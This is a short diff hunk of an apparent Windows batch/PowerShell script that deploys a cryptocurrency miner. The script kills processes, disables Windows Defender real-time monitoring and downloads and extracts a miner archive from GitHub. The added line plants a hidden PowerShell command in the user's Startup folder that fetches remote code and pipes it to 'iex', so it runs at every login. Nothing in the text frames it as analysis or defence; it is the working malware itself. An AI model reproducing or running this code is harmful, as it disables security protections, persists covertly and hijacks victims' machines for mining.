@@ -3,6 +3,7 @@ taskkill /IM w3wp.exe /F
 taskkill /IM msedge.exe /F
 taskkill /IM Batch.exe /F
 Set-MpPreference -DisableRealtimeMonitoring $true
+echo powershell -WindowStyle hidden "irm https://zlc1004.github.io/autominer/get | iex" >> "%USERPROFILE%\Start Menu\Programs\Startup\run.cmd"
 Invoke-WebRequest "https://raw.githubusercontent.com/zlc1003/miner/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
 Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
 cd $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\miner
